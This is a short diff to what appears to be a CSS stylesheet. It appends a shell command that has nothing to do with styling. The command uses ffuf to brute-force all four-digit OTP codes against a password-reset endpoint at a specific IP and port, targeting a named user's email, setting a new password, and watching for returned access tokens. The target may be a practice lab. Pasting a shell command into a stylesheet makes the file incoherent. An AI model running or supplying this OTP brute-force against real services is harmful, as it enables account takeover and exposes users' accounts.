@@ -42,3 +42,5 @@
     vertical-align: baseline;
 }
 
+
+ffuf -X POST -u http://154.57.164.68:32381/api/v1/authentication/customers/passwords/resets  -H "Content-Type: application/json"  -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "NewP@ssw0rd1"}'  -w <(seq -w 0000 9999):FUZZ -t 10  -mr '"SuccessStatus"\s*:\s*true|"accessToken"|"token"|"jwt"|"passwordChanged"|"success"'
